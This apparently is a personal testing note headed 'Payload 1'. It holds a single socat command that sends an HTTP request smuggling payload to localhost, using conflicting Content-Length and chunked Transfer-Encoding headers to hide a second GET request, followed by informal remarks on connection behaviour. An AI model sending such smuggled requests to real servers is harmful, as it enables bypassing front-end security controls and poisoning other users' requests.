# Payload 1

```
cat <(printf "POST /hello HTTP/1.1\r\nHost: localhost\r\nContent-Lenght: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /postshit HTTP/1.1\r\nHost: localhost") - | socat - TCP:localhost:80
```
> [!NOTE]\
> the issue with this is now when i send a request from other terminal window it is not connecting with this we might want to test that 2 connection again!
> edit: it is acctually configured with 2 connection!!!
